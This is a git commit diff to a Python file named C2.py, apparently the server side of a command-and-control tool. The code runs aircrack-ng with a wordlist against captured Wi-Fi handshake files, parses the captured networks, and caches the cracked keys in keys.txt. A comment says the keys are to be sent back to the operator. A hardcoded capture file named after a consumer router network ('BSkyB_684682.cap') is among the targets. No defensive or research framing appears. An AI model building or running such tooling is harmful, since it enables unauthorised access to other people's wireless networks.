3bfb10f6f28c365b2e13d3d50814d40e06187ab3
connor <ConnorKirkpatrick3@gmail.com>
2022-03-13 17:39:26 +0000

    Added code to detect if the network is already cracked to prevent redundant processing

--- C2.py
+++ C2.py
@@ -12,24 +12,71 @@ def bToString(arg):
     return ''.join(map(chr, arg))
 
 
+def getNetworksInFile(data):
+    capturedNetworks = data
+    for i in range(0, len(capturedNetworks)):
+        if capturedNetworks[i].strip().__contains__("BSSID"):
+            start = i
+        elif capturedNetworks[i].strip().__contains__("Choosing") or capturedNetworks[i].strip().__contains__("Index"):
+            end = i
+            break
+    capturedNetworks = capturedNetworks[start + 1:end]
+    networks = []
+    for each in capturedNetworks:
+        if each != '':
+            network = each.strip().split("  ")
+            networks.append([network[1], network[2]])
+
+    return networks
+
+
 def breakKey():
     # to extract the key we use the aircrack tool with a word list
-    # TODO: Add option to brute force rather than word list, or possibly chose the word list
-    print("Extracting key")
-    cracking = subprocess.run(
-        ['.\\aircrack-ng-1.6-win\\bin\\aircrack-ng.exe', "-l", "password", "-w", "wordlist.txt", fileName],
-        shell=True, stdout=subprocess.PIPE)
-    cracking.stdout = bToString(cracking.stdout)
-    if cracking.stdout.__contains__("KEY FOUND"):
-        key = open("password").readline()
-        print("Key found:", key)
-        # delete .cap file
-        subprocess.run(["del", fileName], shell=True)
-        # send key back
+    # TODO: Add option to brute force rather than word list, or possibly chose the word list (USE crunch)
+
+    # check if we have already grabbed the key
+    key = ""
+    file = open("keys.txt", "r")
+    lines = file.readlines()
+    file.close()
+    for line in lines:
+        if line.__contains__(fileName[0:-4]):
+            key = line.split(",")[1]
+            break
+    if key:
+        print("Key already found")
+        print(key)
         return key
     else:
-        return None
+        print("Extracting key")
+        cracking = subprocess.run(
+            ['.\\aircrack-ng-1.6-win\\bin\\aircrack-ng.exe', "-l", "password", "-w", "wordlist.txt", fileName],
+            shell=True, stdout=subprocess.PIPE)
+        cracking.stdout = bToString(cracking.stdout)
+        networks = getNetworksInFile(cracking.stdout.split("\n"))
+        print(networks)
+        if cracking.stdout.__contains__("KEY FOUND"):
+            keyFile = open("password")
+            key = keyFile.readline()
+            keyFile.close()
+            print("Key found:", key)
+            file = open("keys.txt", "a")
+            file.write(fileName[0:-4])
+            file.write(",")
+            file.write(key)
+            file.write("\n")
+            file.close()
+            # delete .cap file
+            # subprocess.run(["del", fileName], shell=True)
+            # send key back
+            return key
+        else:
+            return None
 
+
+fileName = "BSkyB_684682.cap"
+breakKey()
+exit()
 
 HOST = "0.0.0.0"  # Standard loopback interface address (localhost)
 PORT = 1234  # Port to listen on (non-privileged ports are > 1023)
